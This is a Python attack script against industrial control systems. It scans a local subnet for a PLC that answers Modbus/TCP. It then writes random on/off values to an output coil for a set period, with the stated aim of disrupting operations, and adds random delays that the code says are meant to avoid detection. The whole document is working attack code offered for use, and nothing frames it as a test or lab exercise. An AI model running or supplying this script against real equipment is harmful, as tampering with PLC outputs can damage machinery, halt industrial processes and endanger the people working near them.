import random
import time
from pymodbus.client import ModbusTcpClient
from scapy.all import ARP, Ether, srp

### **Step 1: Find the PLC's IP Address**
def find_plc_ip(network_range="192.168.1.0/24"):
    """
    Scans the network to find the PLC by looking for Modbus/TCP responses.
    """
    print("[*] Scanning network for PLC...")
    
    # Creating an ARP request to scan active devices
    arp = ARP(pdst=network_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp

    result = srp(packet, timeout=2, verbose=False)[0]

    active_ips = [res.psrc for res in result]

    # Attempt to connect using Modbus TCP on each found IP
    for ip in active_ips:
        client = ModbusTcpClient(ip)
        if client.connect():
            print(f"[+] Found Modbus-enabled PLC at IP: {ip}")
            client.close()
            return ip

    raise Exception("[-] No PLC found with Modbus/TCP enabled.")

### **Step 2: Brute Force I/O Values**
def brute_force_io(plc_ip, io_address=0, duration=30):
    """
    Repeatedly writes random values to a specific I/O point to disrupt operations.
    Args:
        plc_ip: IP address of the PLC.
        io_address: The register address to target.
        duration: Duration (in seconds) to perform brute force.
    """
    print(f"[*] Initiating Brute Force attack on PLC I/O at {plc_ip}...")
    
    client = ModbusTcpClient(plc_ip)
    
    try:
        if not client.connect():
            print("[-] Failed to connect to PLC")
            return
        
        end_time = time.time() + duration
        while time.time() < end_time:
            # Random value between 0 and 1 (simulating ON/OFF brute force)
            value = random.randint(0, 1)
            
            # Writing to the Modbus coil (output)
            client.write_coil(io_address, value)
            print(f"[+] Wrote value {value} to I/O address {io_address}")

            # Introducing a small delay to avoid instant detection
            time.sleep(random.uniform(0.1, 0.5))

    except Exception as e:
        print(f"[-] Error during brute force attack: {e}")

    finally:
        client.close()
        print("[*] Brute Force attack concluded.")

### **Run the Attack**
if __name__ == "__main__":
    try:
        plc_ip = find_plc_ip("192.168.1.0/24")
        brute_force_io(plc_ip, io_address=0, duration=30)
    except Exception as e:
        print(f"[-] Script Failed: {e}")